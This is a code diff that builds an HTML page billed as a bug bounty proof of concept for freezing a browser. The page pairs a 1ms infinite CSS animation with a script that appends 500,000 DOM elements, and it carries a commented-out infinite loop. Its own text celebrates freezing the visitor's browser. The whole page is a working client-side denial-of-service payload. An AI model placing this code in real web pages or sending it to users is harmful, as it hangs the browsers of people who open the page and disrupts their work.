@@ -1,24 +1,42 @@
-<style>
-  body::before {
-    content: "🐛";
-    animation: spin 1ms infinite;
-  }
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>💥 UI Freeze PoC</title>
+  <style>
+    body::before {
+      content: "🐛 UI Freeze in Progress...";
+      animation: spin 1ms infinite linear;
+      display: block;
+      font-size: 24px;
+      padding: 10px;
+      color: red;
+    }
 
-  @keyframes spin {
-    from { transform: rotate(0deg); }
-    to { transform: rotate(360deg); }
-  }
-</style>
+    @keyframes spin {
+      from { transform: rotate(0deg); }
+      to { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <h1>💣 Bug Bounty PoC: UI Freeze via DOM Overload</h1>
+  <p>If this page freezes your browser, the PoC is successful 😈</p>
+  <script>
+    // DOM Overload
+    for (let i = 0; i < 500000; i++) {
+      const el = document.createElement('div');
+      el.innerText = '💥 Freeze Element #' + i;
+      document.body.appendChild(el);
+    }
 
-<svg xmlns="http://www.w3.org/2000/svg">
-  <g>
-    <!-- Loop ini bisa kamu generate otomatis -->
-    <!-- Contoh 10.000 elemen circle -->
-    <!-- Jangan salin ini manual, nanti gue kasih script generate-nya -->
-    <!-- Contoh sedikit dulu: -->
-    <circle r="1" cx="1" cy="1" />
-    <circle r="1" cx="2" cy="2" />
-    <circle r="1" cx="3" cy="3" />
-    <!-- ... -->
-  </g>
-</svg>
+    // Optional: Infinite Loop (can be uncommented if needed)
+    /*
+    function infiniteFreeze() {
+      while (true) {}
+    }
+    infiniteFreeze();
+    */
+  </script>
+</body>
+</html>
